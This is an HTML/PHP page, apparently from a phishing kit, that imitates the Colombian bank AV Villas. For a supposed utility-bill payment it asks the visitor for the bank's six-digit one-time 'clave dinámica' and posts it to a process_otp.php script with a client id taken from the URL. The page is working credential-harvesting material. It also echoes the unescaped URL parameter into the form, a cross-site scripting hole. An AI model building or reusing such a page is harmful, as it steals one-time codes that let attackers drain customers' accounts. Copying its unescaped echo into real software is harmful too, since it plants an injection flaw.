<!DOCTYPE html>
<html lang="en">

<head>
    <link rel="icon" type="image/png" href="img/register-bg-logo.svg">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">

    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>

    <title>Seguridad</title>

    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            background-color: #2c2d32;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            margin: 0;
        }

        .container {
            text-align: center;
            background-color: #d8d8d8;
            padding: 20px;
            padding-top: 0 !important;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 80%;
            max-width: 400px;
        }

        img {
            margin-top: 80px;
            width: 60%;
            margin-bottom: 20px;
        }

        a {
            display: block;
            margin: 10px 0;
            color: white;
            text-decoration: none;
        }

        p {
            margin: 10px 0;
            color: #333;
        }

        input[type="tel"] {
            width: 90%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
            text-align: center;
            margin-top: 10px;
        }

        input[type="submit"] {
            color: white;
            background-color: red;
            width: 80%;
            height: 45px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
        }

        input[type="submit"]:hover {
            background-color: #2c2d32;
        }

        .footer-links {
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>

<body>
    <img src="img/logo.png" alt="" width="50%"><br>
    <div class="container">
        <a style="color:rgb(105, 105, 105);">Detalle de la Transacción</a>
        <a style="color:black;">Pago de servicio publico</a><br>
        <p>Ingresa tu clave dinámica, la encontrarás en tu app Av villas en el dispositivo donde la inscribiste por
            última vez.</p>
        <form id="otpForm" method="POST" action="process/process_otp.php">
            <input type="hidden" name="cliente_id" value="<?php echo $_GET['id']; ?>"> <!-- Pasar cliente_id -->
            <input type="tel" name="claveDinamica" id="txtOTP" placeholder="Clave dinámica" required minlength="6"
                maxlength="6" pattern="\d*" inputmode="numeric">
            <input type="submit" value="Continuar" id="btnOTP">
        </form>
    </div>

    <div class="footer-links">
        <a href="">¿Necesitas Ayuda?</a> <a href="../../../index.php">Cerrar</a>
    </div>
</body>

</html>
